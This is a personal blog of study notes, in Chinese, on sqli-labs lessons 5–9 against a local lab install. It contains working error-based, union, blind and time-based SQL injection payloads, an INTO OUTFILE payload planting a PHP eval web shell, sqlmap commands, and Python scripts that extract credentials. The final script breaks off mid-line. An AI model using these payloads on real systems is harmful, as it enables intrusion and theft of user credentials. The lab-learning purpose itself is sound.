<p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&gt;XPATH syntax <span class="hljs-type">error</span>: <span class="hljs-string">&#x27;~emails,referers,uagents,users~&#x27;</span>  <br><br>爆字段<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’),0x7e),1)–+</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&gt;XPATH syntax <span class="hljs-keyword">error</span>: &#x27;~<span class="hljs-built_in">id</span>,username,password~&#x27;<br><br>爆表<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://localhost:32768/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20group_concat(id,username,password)from%20users),0x7e),1)--+">http://localhost:32768/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20group_concat(id,username,password)from%20users),0x7e),1)--+</a></p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">&gt;<span class="hljs-keyword">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>DumbDumb,<span class="hljs-number">2</span>AngelinaI-kill-you,<span class="hljs-number">3</span>&#x27;  <br><br>发现回显不完全，听说<span class="hljs-keyword">xpath</span>报错有长度限制，改为：<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select group_concat(id,username,password)from users limit 0,1),0x7e),1)–+</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">发现<span class="hljs-built_in">limit</span>的值改变了依然没结果，看了眼csdn，发现group_concat要改为<span class="hljs-built_in">concat</span>，  <br>问了kimi，<span class="hljs-built_in">limit</span>是限制输出的行在哪，如(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)就会限制为从第一行开始提取一列，但是用group_concat，会将一整个表整合为一行，限制就没用了。<br><br>最后payload改为<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1)–+</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>成功，只要一条条爆出<span class="hljs-built_in">users</span>表中内容就行了。<br><br></code></pre></td></tr></table></figure>
<h1 id="sql-labs-less6"><a href="#sql-labs-less6" class="headerlink" title="sql-labs less6"></a>sql-labs less6</h1><p>和less5原理一样</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$get_id</span>&quot;</span><br></code></pre></td></tr></table></figure>
<p>闭合payload改为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;<br></code></pre></td></tr></table></figure>
<p>即可</p>
<hr>
<h2 id="title-note-04date-2025-03-02-16-20-58tags-sql-labs"><a href="#title-note-04date-2025-03-02-16-20-58tags-sql-labs" class="headerlink" title="title: note-04date: 2025-03-02 16:20:58tags: sql-labs"></a>title: note-04<br>date: 2025-03-02 16:20:58<br>tags: sql-labs</h2><h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>需要先设置mysql的文件读写权限：  </p>
<blockquote>
<p>Windows的配置文件在mysql下的my.ini<br>Linux的配置文件在&#x2F;etc&#x2F;conf  </p>
</blockquote>
<p>怎么找也找不到，最后问了卡密，在&#x2F;etc&#x2F;mysql中找到了；<br>但是还是没法写马；<br>docker环境现在还没搞懂，以后有机会再在其它环境下再部署sql-labs试试；</p>
<h2 id="看网上的解法写点笔记："><a href="#看网上的解法写点笔记：" class="headerlink" title="看网上的解法写点笔记："></a>看网上的解法写点笔记：</h2><p>先判断注入类型，没有sql错误回显的情况就不断猜测闭合语句，能正确闭合不报错就表示闭合成功  </p>
<p>因为用 ‘ 打破’’闭合但是没用猜对全部闭合的话会一直提示sql语法错误，能完成闭合并且并且不报错就为完全猜对。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>然后用联合查询<br>select搭配into outfile能写入数据<br>大概是select能查询数据，into outfile能写入数据<br>union select 1,user(),database() into outfile “路径”<br>能写入：<br>1，当前用户，数据库名称</p>
<blockquote>
<p>url 中反斜杠\会被当作转义字符处理所以要用两个反斜杠来传入</p>
</blockquote>
<p>写马</p>
<blockquote>
<p>?id&#x3D;1’)) union select 1,2,’<?php @eval($_POST["mima"])?>‘ into outfile “C:\phpStudy\WWW\sqli\Less-7\test.php” – #  </p>
</blockquote>
<p>这里的路径不是我的环境<br>现在才知道原来$_GET和POST必须大写…..<br>最后连马就行</p>
<h2 id="另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果"><a href="#另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果" class="headerlink" title="另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果"></a>另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果</h2><blockquote>
<p>在sql中能用‘@@datadir’ 返回数据库的绝对路径，随后猜测网站的绝对路径  </p>
</blockquote>
<p>将查询到的当前用户和数据库名称写入到题目目录下的1.txt随后访问就能看到查询结果</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>(), <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\1.txt&quot;</span> --+<br></code></pre></td></tr></table></figure>
<p>然后就是标准操作</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\2.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>我想，因为不用担心回显界面问题所以也可以不用group_concat,union等，前面两个的查询也是一样</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\3.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>爆字段</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=&#x27;users&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\4.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>其实我看没有了回显页面的限制，不用爆字段也行，直接爆表就得：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\5.txt&quot;</span> <span class="hljs-comment">--+ </span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传1.txt，下次再上传1.txt，就是无效命令了，也就是新的1.txt中的内容并不会覆盖之前的1.txt</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46315342/article/details/106557552">https://blog.csdn.net/m0_46315342/article/details/106557552</a></p>
<hr>
<h2 id="title-note-05date-2025-03-04-21-17-54tags-sql-labs"><a href="#title-note-05date-2025-03-04-21-17-54tags-sql-labs" class="headerlink" title="title: note-05date: 2025-03-04 21:17:54tags: sql-labs"></a>title: note-05<br>date: 2025-03-04 21:17:54<br>tags: sql-labs</h2><h1 id="修正sql-labs-less7错误"><a href="#修正sql-labs-less7错误" class="headerlink" title="修正sql-labs-less7错误"></a>修正sql-labs-less7错误</h1><p>实现了win下phpstudy部署sqli，自己做了一遍less7，发现了select和union select的问题，<br>上次我以为有了文件写入后不需要union了，后来发现并不是这样，没了union会失败<br>问了kimi  </p>
<blockquote>
<p>为什么<br>?id&#x3D;-1’)) union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>而<br>?id&#x3D;-1’)) select table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>不生效  </p>
</blockquote>
<p>KIMI:</p>
<blockquote>
<p><em><strong>为什么UNION SELECT是关键？</strong></em><br>UNION SELECT的作用是把两个查询的结果合并在一起，而不是直接替换原始查询。它要求两个查询的列数和数据类型匹配，但只要满足这些条件，就能让注入的语句与原始查询兼容。而直接的SELECT语句没有这种兼容性，直接破坏了原始查询的结构，导致语法错误。<br><em><strong>数据库的执行逻辑决定了这一切</strong></em><br>数据库在解析SQL语句时，会严格按照语法规则执行。如果注入的语句破坏了原始查询的结构，数据库会报错。这种报错可能不会直接显示给用户，但会导致注入失败。第一个语句通过UNION SELECT与原始查询兼容，所以能成功；第二个语句直接破坏了原始查询的语法，所以失败。<br><em><strong>权限和路径不是问题</strong></em><br>INTO OUTFILE操作需要数据库户具有FILE权限，而且目标路径必须有效。但既然第一个语句已经成功，说明权限和路径都没有问题。第二个语句失败的原因完全在于语法错误，而不是权限或路径。  </p>
</blockquote>
<p>原来联合注入漏洞叫<em><strong>联合</strong></em>是这个原理</p>
<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>该题测试没有报错回显，只有登录是否成功回显<br>只能用盲注了，<br>sqlmap或上次less5的脚本都行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --batch --dbs<br><br>--batch表示碰到选择时选用默认选项，--dbs表示爬取所有数据库名<br>-D  库名 --tables表示爬取某数据库下的所有表<br>-D 库名 -T 表名--columns表示爬取某库下某表的所有列<br></code></pre></td></tr></table></figure>

<p>less5脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-8/&quot;</span> <br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span> <br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span> <br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 长度为: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取第 <span class="hljs-subst">&#123;i&#125;</span> 个字符...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 当前结果: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据库名: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表数量: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表名: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    target_table = <span class="hljs-string">&quot;users&quot;</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的字段...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段数量: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段名: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的数据...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取字段: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据条数: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>顺便学习一下ctfshow web8 的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>url = <span class="hljs-string">&#x27;http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/&#x27;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br> <br><span class="hljs-comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">45</span>):<br>    <span class="hljs-comment"># 获取当前使用的数据库</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取当前数据库的所有表</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的字段</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的数据</span><br>    payload = <span class="hljs-string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)<br>    <span class="hljs-comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">128</span>):<br>        result = requests.get(url + payload % (i, j))<br> <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;If&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>            name += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据库名/表名/字段名/数据: %s&#x27;</span> % name)<br>            <span class="hljs-keyword">break</span><br> <br>        <span class="hljs-comment"># 如果某个字符不存在,则停止程序</span><br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> count &gt;= (<span class="hljs-number">128</span> - <span class="hljs-number">31</span>):<br>            exit()<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/120115458">https://blog.csdn.net/wangyuxiang946/article/details/120115458</a></p>
<hr>
<h2 id="title-note-06date-2025-03-05-17-52-14tags-sql-labs"><a href="#title-note-06date-2025-03-05-17-52-14tags-sql-labs" class="headerlink" title="title: note-06date: 2025-03-05 17:52:14tags: sql-labs"></a>title: note-06<br>date: 2025-03-05 17:52:14<br>tags: sql-labs</h2><h1 id="sql-labs-less9"><a href="#sql-labs-less9" class="headerlink" title="sql-labs-less9"></a>sql-labs-less9</h1><p>题目说了是单引号闭合，然后怎么尝试都返回</p>
<blockquote>
<p>You are in………..  </p>
</blockquote>
<p>没有登录是否成功回显，没有sql报错回显<br>意思就是只能用时间延迟来判断注入是否正确，无法像less8能用respond长度来判断是否正确了<br>使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep()<br>和<br>if<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure>
<p>来构造payload,例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;,1,sleep(2)) --+</span><br></code></pre></td></tr></table></figure>
<p>意思是如果数据库第一个字符为’s’，则返回1（true）,否则则延迟回显<br>基于此原理</p>
<p>KIMI：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>ALPHABET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br>URL = <span class="hljs-string">&quot;http://sqli-labs.com/Less-9/?id=1&#x27; and substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27; and sleep(&#123;time&#125;)--+&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()<br>    response = requests.get(path)<br>    end = time.time()<br>    <span class="hljs-keyword">if</span> response.status_code == <span 